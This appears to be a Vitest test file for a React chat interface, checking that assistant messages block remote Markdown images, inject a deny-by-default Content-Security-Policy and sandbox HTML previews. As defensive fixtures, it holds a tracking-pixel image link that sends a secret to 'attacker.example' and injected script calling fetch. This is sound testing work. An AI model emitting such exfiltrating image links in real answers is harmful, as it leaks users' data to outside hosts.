// @vitest-environment jsdom

import React from "react";
import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";

import { buildSandboxHtml, MessageBubble } from "@/components/chat/message-bubble";

afterEach(cleanup);

describe("generated-content privacy boundaries", () => {
    it("blocks remote Markdown images until the user explicitly loads one", () => {
        render(
            <MessageBubble role="assistant" content="![tracking pixel](https://attacker.example/collect?id=secret)" />
        );

        expect(screen.queryByRole("img", { name: "tracking pixel" })).toBeNull();
        expect(screen.getByText("External image blocked")).toBeTruthy();
        expect(screen.getByText("(attacker.example)")).toBeTruthy();

        fireEvent.click(screen.getByRole("button", { name: "Load once" }));

        const image = screen.getByRole("img", { name: "tracking pixel" });
        expect(image.getAttribute("src")).toBe("https://attacker.example/collect?id=secret");
        expect(image.getAttribute("crossorigin")).toBe("anonymous");
        expect(image.getAttribute("referrerpolicy")).toBe("no-referrer");
    });

    it("renders same-origin Markdown images without an approval prompt", () => {
        render(<MessageBubble role="assistant" content="![local diagram](/screenshots/chat-workbench.png)" />);

        expect(screen.getByRole("img", { name: "local diagram" })).toBeTruthy();
        expect(screen.queryByRole("button", { name: "Load once" })).toBeNull();
    });

    it("does not treat the old synthetic n0x.local hostname as a trusted origin", () => {
        render(<MessageBubble role="assistant" content="![old host](https://n0x.local/tracker.png)" />);

        expect(screen.queryByRole("img", { name: "old host" })).toBeNull();
        expect(screen.getByText("External image blocked")).toBeTruthy();
        expect(screen.getByText("(n0x.local)")).toBeTruthy();
    });

    it("styles legacy messages with unknown provenance neutrally", () => {
        render(
            <MessageBubble
                role="assistant"
                content="Legacy answer"
                meta={{ provider: "browser", providerLabel: "Unknown", privacy: "unknown" }}
            />
        );

        const badge = screen.getByText(/UNKNOWN · Unknown/i).closest("span");
        expect(badge?.className).toContain("border-zinc-700");
        expect(badge?.className).not.toContain("border-emerald");
    });

    it("injects a deny-by-default CSP into generated artifacts", () => {
        const html = buildSandboxHtml(
            "<!-- <head>fake</head> --><!doctype html><html><head><title>attacker marker</title></head><body><script>fetch('https://example.com')</script></body></html>",
            "html"
        );

        expect(html).toContain('http-equiv="Content-Security-Policy"');
        expect(html).toContain("default-src 'none'");
        expect(html).toContain("connect-src 'none'");
        expect(html).toContain("form-action 'none'");
        expect(html).toContain('name="referrer" content="no-referrer"');
        expect(html.indexOf('http-equiv="Content-Security-Policy"')).toBeLessThan(html.indexOf("attacker marker"));
    });

    it("gives artifact previews only script permission", () => {
        render(
            <MessageBubble
                role="assistant"
                content={"```html\n<!doctype html><html><body><h1>Preview</h1></body></html>\n```"}
            />
        );

        fireEvent.click(screen.getByRole("button", { name: "Preview html code" }));
        const frame = screen.getByTitle("html preview");

        expect(frame.getAttribute("sandbox")).toBe("allow-scripts");
        expect(frame.getAttribute("sandbox")).not.toContain("allow-popups");
        expect(frame.getAttribute("sandbox")).not.toContain("allow-forms");
        expect(frame.getAttribute("srcdoc")).toContain("connect-src 'none'");
    });
});
